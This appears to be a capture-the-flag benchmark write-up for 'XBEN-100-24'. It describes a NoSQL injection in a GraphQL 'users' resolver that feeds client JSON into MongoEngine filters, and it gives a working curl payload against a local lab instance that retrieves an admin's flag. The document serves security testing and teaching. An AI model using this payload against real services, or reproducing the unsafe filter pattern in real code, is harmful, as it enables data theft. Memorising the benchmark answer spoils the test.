# XBEN-100-24 — View the admins

> **Live PoC:** Start the benchmark with `make run`, then run `make poc` from its benchmark directory. The runner discovers the current published port and prints only the flag recovered from the running service.

**Vulnerability:** NoSQL injection via a GraphQL query argument. `schema.py`'s `resolve_users`
`json.loads()`s the client-supplied `search` argument and passes the resulting dict straight into
MongoEngine as filter kwargs: `query = query.filter(**search_criteria)`. This lets an attacker use
arbitrary MongoEngine/MongoDB query operators (e.g. `field__exists`, `field__ne`) instead of a
plain equality filter. The `User` model has a `flag` field that's only populated on the `admin2`
user (`app.py`'s `reset_database()`), and the UI normally filters out admins, but nothing stops a
direct GraphQL query for `flag__exists: true`, which returns the admin2 record including its
`flag` field.

## Setup

```bash
cd /Users/younessbouchari/red-purple/xbow/benchmarks/XBEN-100-24
```

## Exploit

```bash
curl -s -X POST "http://localhost:55459/graphql" -H "Content-Type: application/json" \
  -d '{"query": "query { users(search: \"{\\\"flag__exists\\\": true}\") { username email flag } }"}'
```

(The `search` argument is itself JSON, double-encoded inside the GraphQL query string:
`{"flag__exists": true}` is the injected MongoEngine filter.)
